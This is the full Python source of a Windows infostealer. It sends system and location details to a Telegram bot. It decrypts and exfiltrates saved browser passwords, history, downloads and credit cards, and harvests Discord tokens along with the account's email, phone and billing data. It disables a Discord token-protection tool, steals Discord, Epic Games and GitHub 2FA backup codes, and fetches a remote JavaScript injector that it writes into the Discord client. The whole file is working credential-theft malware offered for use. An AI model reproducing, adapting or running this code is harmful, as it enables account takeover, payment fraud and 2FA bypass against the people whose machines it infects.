import os
import re
import subprocess
import requests
import shutil
import platform
import psutil
import base64
import json
import sqlite3
from Crypto.Cipher import AES
from datetime import datetime
from win32crypt import CryptUnprotectData

# Define the required classes and variables
__LOGINS__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

bot_token = ''
chat_id = ''

def send_telegram_message(bot_token, chat_id, message):
    """Envoie un message structuré à Telegram."""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Error sending message: {response.text}")

def get_geolocation():
    """Récupère les informations de géolocalisation."""
    try:
        ip_info = requests.get("https://api.ipify.org?format=json").json()
        public_ip = ip_info['ip']

        location_info = requests.get(f'http://ip-api.com/json/{public_ip}?fields=66842623').json()
        geo_location = {
            'city': location_info.get('city', 'N/A'),
            'region': location_info.get('regionName', 'N/A'),
            'country': location_info.get('country', 'N/A'),
            'lat': location_info.get('lat', 'N/A'),
            'lon': location_info.get('lon', 'N/A'),
            'timezone': location_info.get('timezone', 'N/A'),
            'public_ip': public_ip
        }
    except Exception as e:
        geo_location = {'error': str(e)}

    return geo_location

def get_system_info():
    """Récupère les informations système."""
    os_system = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    architecture = platform.architecture()[0]
    node_name = platform.node()
    machine_type = platform.machine()
    processor = platform.processor()
    pc_username = os.getenv("UserName") or "N/A"

    # CPU Informations
    cpu_cores = psutil.cpu_count(logical=False)
    logical_cores = psutil.cpu_count(logical=True)
    cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
    cpu_usage = psutil.cpu_percent(interval=1)

    # RAM Informations
    total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    available_ram = round(psutil.virtual_memory().available / (1024 ** 3), 2)
    used_ram = round(psutil.virtual_memory().used / (1024 ** 3), 2)
    ram_usage = psutil.virtual_memory().percent

    # Disk Informations
    disk_total = round(psutil.disk_usage('/').total / (1024 ** 3), 2)
    disk_used = round(psutil.disk_usage('/').used / (1024 ** 3), 2)
    disk_free = round(psutil.disk_usage('/').free / (1024 ** 3), 2)
    disk_usage = psutil.disk_usage('/').percent

    return {
        "os_system": os_system,
        "os_version": os_version,
        "os_release": os_release,
        "architecture": architecture,
        "node_name": node_name,
        "machine_type": machine_type,
        "processor": processor,
        "pc_username": pc_username,
        "cpu_cores": cpu_cores,
        "logical_cores": logical_cores,
        "cpu_freq": cpu_freq,
        "cpu_usage": cpu_usage,
        "total_ram": total_ram,
        "available_ram": available_ram,
        "used_ram": used_ram,
        "ram_usage": ram_usage,
        "disk_total": disk_total,
        "disk_used": disk_used,
        "disk_free": disk_free,
        "disk_usage": disk_usage,
        "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
        "uptime": int(datetime.now().timestamp() - psutil.boot_time())
    }

def create_geolocation_message(geo_location):
    """Crée un message Telegram pour les informations de géolocalisation."""
    message = f"🌍 Geolocation Info\n\n"
    message += f"📍 City: `{geo_location.get('city', 'N/A')}`\n"
    message += f"🗺️ Region: `{geo_location.get('region', 'N/A')}`\n"
    message += f"🎌 Country: `{geo_location.get('country', 'N/A')}`\n"
    message += f"📏 Latitude/Longitude: `{geo_location.get('lat', 'N/A')} / {geo_location.get('lon', 'N/A')}`\n"
    message += f"⏱️ Timezone: `{geo_location.get('timezone', 'N/A')}`\n"
    message += f"🌐 Public IP: `{geo_location.get('public_ip', 'N/A')}`\n"
    return message

def create_system_info_message(system_info):
    """Crée un message Telegram pour les informations système."""
    message = f"💻 System Information\n\n"
    message += f"🖥️ OS: `{system_info['os_system']} {system_info['os_version']} ({system_info['os_release']})`\n"
    message += f"👤 User: `{system_info['pc_username']}`\n"
    message += f"🖥️ Architecture: `{system_info['architecture']}`\n"
    message += f"🔧 Processor: `{system_info['processor']}`\n"
    message += f"🔹 Node Name: `{system_info['node_name']}`\n"
    message += f"🔸 Machine Type: `{system_info['machine_type']}`\n"
    message += f"🧠 Cores: `{system_info['cpu_cores']}`\n"
    message += f"💻 Logical Cores: `{system_info['logical_cores']}`\n"
    message += f"⚡ Frequency: `{system_info['cpu_freq']} MHz`\n"
    message += f"🔋 CPU Usage: `{system_info['cpu_usage']}%`\n"
    message += f"🧠 Total RAM: `{system_info['total_ram']} GB`\n"
    message += f"📊 Used RAM: `{system_info['used_ram']} GB ({system_info['ram_usage']}%)`\n"
    message += f"💾 Disk: `{system_info['disk_total']} GB (Used: {system_info['disk_used']} GB, Free: {system_info['disk_free']} GB)`\n"
    message += f"⏰ Boot Time: `{system_info['boot_time']}`\n"
    message += f"⏳ Uptime: `{system_info['uptime']} seconds`\n"
    return message

def send_system_and_geolocation_info_to_telegram(bot_token, chat_id):
    """Envoie les informations système et géolocalisation à Telegram."""
    # Obtenir les informations de géolocalisation
    geo_location = get_geolocation()
    geo_location_message = create_geolocation_message(geo_location)

    # Obtenir les informations système
    system_info = get_system_info()
    system_info_message = create_system_info_message(system_info)

    # Envoi à Telegram
    send_telegram_message(bot_token, chat_id, geo_location_message)
    send_telegram_message(bot_token, chat_id, system_info_message)

class Discord:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        self.send_to_telegram()

    def send_to_telegram(self):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']
            bio = user['bio'] if user.get('bio') else "None"
            locale = user.get('locale', 'Unknown')

            mfa = "✅" if user.get('mfa_enabled') else "❌"

            premium_types = {
                0: "❌",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), "❌")

            if "message" in payment or payment == []:
                methods = "❌"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "Paypal" if method['type'] == 2 else "❓" for method in payment])

            message = f"""
*👤 User:* {username}({discord_id})
*🔑 Token:* `{token}`
*📧 Email:* `{email}`
*☎️ Phone:* `{phone}`
*🔐 2FA:* `{mfa}`
*💳 Billing:* `{methods}`
*✨ Nitro:* `{nitro}`
*📝 Bio:* `{bio}`
"""
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            payload = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "Markdown"
            }
            requests.post(url, data=payload)
            self.tokens_sent.append(token)

class BackupCodes:
    def __init__(self, bot_token, chat_id):
        self.path = os.environ["HOMEPATH"]
        self.discord_code_path = '\\Downloads\\discord_backup_codes.txt'
        self.epic_code_file = 'Epic Games Account Two-Factor backup codes.txt'
        self.github_code_file = 'github-recovery-codes.txt'
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.main_folder_path = os.path.join(os.path.expanduser('~'), 'Documents')  # Main folder for found files
        self.folders_to_search = ['Downloads', 'Documents']

        self.g3t_d15c0rd_c0d35()
        self.g3t_3p1c_c0d35()
        self.f1nd_g1thub_b4ckup_c0d35()

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {
            "chat_id": self.chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, data=data)
        if response.status_code != 200:
            print(f"Error sending message: {response.text}")

    def send_telegram_file(self, file_content, filename):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
        files = {'document': ('file', file_content)}
        data = {'chat_id': self.chat_id, 'caption': filename}
        response = requests.post(url, files=files, data=data)
        if response.status_code != 200:
            print(f"Error sending file: {response.text}")

    def g3t_d15c0rd_c0d35(self):
        if os.path.exists(self.path + self.discord_code_path):
            codes = []
            with open(self.path + self.discord_code_path, 'r', encoding="utf-8", errors='ignore') as g:
                for line in g.readlines():
                    if line.startswith("*"):
                        codes.append(line.strip())

            if codes:
                codes_text = "\n".join(codes)
                self.send_telegram_message(f"**Discord 🔐 2FA Codes Detected**\n\n```\n{codes_text}\n```")
                self.send_telegram_file(codes_text, "discord_backup_codes.txt")

    def g3t_3p1c_c0d35(self):
        for folder in self.folders_to_search:
            folder_path = os.path.join(os.path.expanduser('~'), folder)
            epic_file_path = os.path.join(folder_path, self.epic_code_file)

            if os.path.exists(epic_file_path):
                with open(epic_file_path, 'r', encoding="utf-8", errors='ignore') as f:
                    epic_codes = f.read()

                if epic_codes:
                    self.send_telegram_message(f"**Epic Games 🔐 2FA Codes Detected**\n\n```\n{epic_codes}\n```")
                    self.send_telegram_file(epic_codes, "Epic_Games_2FA_Backup_Codes.txt")

    def f1nd_g1thub_b4ckup_c0d35(self):
        for search_folder in self.folders_to_search:
            try:
                folder_path = os.path.join(os.path.expanduser('~'), search_folder)
                files = os.listdir(folder_path)

                for current_file in files:
                    if current_file == self.github_code_file:
                        source_file_path = os.path.join(folder_path, current_file)
                        destination_file_path = os.path.join(self.main_folder_path, current_file)

                        try:
                            shutil.copy2(source_file_path, destination_file_path)
                            print(f"📝 GitHub Backup codes file copied to: {destination_file_path}")

                            with open(destination_file_path, 'r', encoding="utf-8", errors='ignore') as file:
                                file_content = file.read()

                            message = f"🔒 GitHub Backup Codes Found\n\n```{destination_file_path}\n\n{file_content}```"
                            self.send_telegram_message(message)
                            self.send_telegram_file(file_content, "GitHub_Backup_Codes.txt")  # Sending the file as well
                        except Exception as error:
                            print(f"❌ Error copying file: {str(error)}")
            except Exception as err:
                print(f"❌ Error reading folder {search_folder}: {str(err)}")

class Injection:
    def __init__(self, bot_token: str, chat_id: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\\\Discord',
            self.appdata + '\\\\DiscordCanary',
            self.appdata + '\\\\DiscordPTB',
            self.appdata + '\\\\DiscordDevelopment'
        ]
        
        # Fetch the injector script
        response = requests.get('https://raw.githubusercontent.com/h3lloworld1337/Discord-Injection/main/injection.js')
        if response.status_code != 200:
            print("Failed to fetch injector script")
            return

        # Replace placeholders with bot token and chat ID
        self.code = response.text.replace('%BOT_TOKEN%', bot_token).replace('%CHAT_ID%', chat_id)

        # Kill Discord processes if running
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        # Inject the modified code into Discord directories
        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            core_info = self.get_core(dir)
            if core_info is not None:
                with open(core_info[0] + '\\\\index.js', 'w', encoding='utf-8') as f:
                    f.write(self.code.replace('discord_desktop_core-1', core_info[1]))
                self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\\\' + file + '\\\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\\\' + file + '\\\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\\\index.js'):
                            continue
                        return core, file
        return None

    def start_discord(self, dir: str) -> None:
        update = dir + '\\\\Update.exe'
        executable = dir.split('\\\\')[-1] + '.exe'
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\\\' + file
                if os.path.exists(app + '\\\\modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f"URL: {self.url}, Username: {self.username}, Password: {self.password}"

    class WebHistory:
        def __init__(self, url, title, last_visit_time):
            self.url = url
            self.title = title
            self.last_visit_time = last_visit_time

        def __str__(self):
            return f"URL: {self.url}, Title: {self.title}, Visit: {self.last_visit_time}"

    class Download:
        def __init__(self, url, target_path):
            self.url = url
            self.target_path = target_path

        def __str__(self):
            return f"URL: {self.url}, Path: {self.target_path}"

    class CreditCard:
        def __init__(self, name_on_card, expiration_month, expiration_year, card_number_encrypted):
            self.name_on_card = name_on_card
            self.expiration_month = expiration_month
            self.expiration_year = expiration_year
            self.card_number_encrypted = card_number_encrypted

        def __str__(self):
            return f"Name: {self.name_on_card}, Expiry: {self.expiration_month}/{self.expiration_year}, Card Number: {self.card_number_encrypted}"


class done:
    def __init__(self):
        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs("result", exist_ok=True)

        if __LOGINS__:
            with open("result\\Passwords.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __WEB_HISTORY__:
            with open("result\\Web History.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("result\\Downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("result\\Cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        shutil.make_archive("result", 'zip', "result")

    def send(self):
        telegram_api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"  # Replace with your Telegram Bot token
        
        text_message = self.create_summary()

        
        response = requests.post(telegram_api_url, data={
            "chat_id": chat_id,
            "text": text_message, 
            "parse_mode": "Markdown" 
        })

        if response.status_code == 200:
            print("✅ Message sent successfully to Telegram!")
        else:
            print(f"❌ Failed to send message: {response.status_code} - {response.text}")

        
        self.send_file()

    def create_summary(self):
        summary = "Browser Info:\n\n"
        if __LOGINS__:
            summary += f"🔑 **Total Logins Grabbed:** {len(__LOGINS__)}\n"
        if __WEB_HISTORY__:
            summary += f"🌐 **Total Web History Entries Grabbed:** {len(__WEB_HISTORY__)}\n"
        if __DOWNLOADS__:
            summary += f"📥 **Total Downloads Grabbed:** {len(__DOWNLOADS__)}\n"
        if __CARDS__:
            summary += f"💳 **Total Credit Cards Grabbed:** {len(__CARDS__)}\n"
        return summary

    def send_file(self):
        files = {'document': open('result.zip', 'rb')}  
        file_data = {'chat_id': chat_id}

        
        response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", data=file_data,
                                 files=files)

        if response.status_code == 200:
            print("✅ File sent successfully to Telegram!")
        else:
            print(f"❌ Failed to send file: {response.status_code} - {response.text}")

    def clean(self):
        
        shutil.rmtree("result")
        os.remove("result.zip")


class walkthrough:
    
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'thorium': self.appdata + '\\Thorium\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Person 1',
            'Person 2',
            'Person 3',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_web_history(self, path: str, profile: str):

        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')  # Ajout de visit_count
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        credit_cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(credit_cards_db):
            return

        shutil.copy(credit_cards_db, 'credit_cards_db')
        conn = sqlite3.connect('credit_cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], row[3]))

        conn.close()
        os.remove('credit_cards_db')


def __M4in_1Ld():
    send_system_and_geolocation_info_to_telegram(bot_token, chat_id)
    
    walkthrough()
    done()

    discord = Discord(bot_token, chat_id)
    discord.killprotector()
    discord.grabTokens()
    discord.send_to_telegram()

    Injection(bot_token, chat_id)

    BackupCodes(bot_token, chat_id)

if __name__ == "__main__":
    __M4in_1Ld()
